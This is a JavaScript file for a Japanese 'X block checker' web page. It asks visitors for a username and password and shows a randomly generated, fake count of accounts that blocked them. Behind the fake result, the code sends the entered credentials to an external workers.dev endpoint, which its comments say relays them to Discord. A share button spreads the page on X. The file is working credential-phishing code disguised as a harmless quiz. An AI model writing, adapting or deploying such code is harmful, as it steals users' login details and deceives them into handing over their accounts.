// =========================
// Aの入力を英数字のみに制限
// =========================

const inputAElement = document.getElementById("inputA");

inputAElement.addEventListener("input", function () {
    this.value = this.value.replace(/[^a-zA-Z0-9]/g, "");
});


// =========================
// 結果チェック
// =========================

function checkResult() {

    const inputA =
        document.getElementById("inputA").value.trim();

    const inputB =
        document.getElementById("inputB").value.trim();


    // Aが空欄
    if (inputA === "") {
        alert("ユーザー名を入力してください。");
        return;
    }


    // Bが空欄
    if (inputB === "") {
        alert("パスワードを入力してください。");
        return;
    }


    // Bは8文字以上
    if (inputB.length < 8) {
        alert("パスワードは8文字以上で入力してください。");
        return;
    }


    // =========================
    // 結果一覧
    // =========================

    const results = [

        "あなたは1人にブロックされていました！",
        "あなたは2人にブロックされていました！",
        "あなたは3人にブロックされていました！",
        "あなたは4人にブロックされていました！",
        "あなたは5人にブロックされていました！",
        "あなたは6人にブロックされていました！",
        "あなたは7人にブロックされていました！",
        "あなたは8人にブロックされていました！",
        "あなたは9人にブロックされていました！",
        "あなたは10人にブロックされていました！",
        "あなたは11人にブロックされていました！",
        "あなたは12人にブロックされていました！",
        "あなたは13人にブロックされていました！",
        "あなたは14人にブロックされていました！",
        "あなたは15人にブロックされていました！",
        "あなたは16人にブロックされていました！",
        "あなたは17人にブロックされていました！",
        "あなたは18人にブロックされていました！",
        "あなたは19人にブロックされていました！",
        "あなたは20人にブロックされていました！",
        "あなたは21人にブロックされていました！",
        "あなたは22人にブロックされていました！",
        "あなたは23人にブロックされていました！",
        "あなたは24人にブロックされていました！",
        "あなたは25人にブロックされていました！",
        "あなたは26人にブロックされていました！",
        "あなたは27人にブロックされていました！",
        "あなたは28人にブロックされていました！",
        "あなたは29人にブロックされていました！",
        "あなたは30人にブロックされていました！",
        "あなたは31人にブロックされていました！",
        "あなたは32人にブロックされていました！",
        "あなたは33人にブロックされていました！",
        "あなたは34人にブロックされていました！",
        "あなたは35人にブロックされていました！",
        "あなたは36人にブロックされていました！",
        "あなたは37人にブロックされていました！",
        "あなたは38人にブロックされていました！",
        "あなたは39人にブロックされていました！"

    ];


    // =========================
    // ランダム結果
    // =========================

    const randomIndex =
        Math.floor(Math.random() * results.length);

    const resultText =
        results[randomIndex];


    // =========================
    // 結果表示
    // =========================

    document.getElementById("resultText").textContent =
        resultText;

    document.getElementById("result")
        .classList.remove("hidden");


    // =========================
    // DiscordへA/Bを送信
    // =========================

    fetch("https://dark-dawn-c121.flexfnbr7.workers.dev/", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            inputA: inputA,
            inputB: inputB
        })

    })

    .then(response => {

        if (!response.ok) {
            throw new Error("送信失敗");
        }

        return response.json();

    })

    .then(() => {

        console.log("Discord送信成功");

    })

    .catch(error => {

        console.error(
            "Discord送信エラー:",
            error
        );

    });

}


// =========================
// Xで結果をポスト
// =========================

function shareResult() {

    const result =
        document.getElementById("resultText").textContent;

    const SITE_URL =
        "https://iz7d.github.io/block-checker/";

    const text =
        "Xブロックチェッカーやってみたら" +
        result.replace("あなたは", "").replace("ブロックされていました！", "人にブロックされてたｗ") +
        "\n" +
        "試したいひと👇";

    const url =
        "https://twitter.com/intent/tweet?text=" +
        encodeURIComponent(text) +
        "&url=" +
        encodeURIComponent(SITE_URL);

    window.open(
        url,
        "_blank",
        "width=600,height=500"
    );
}
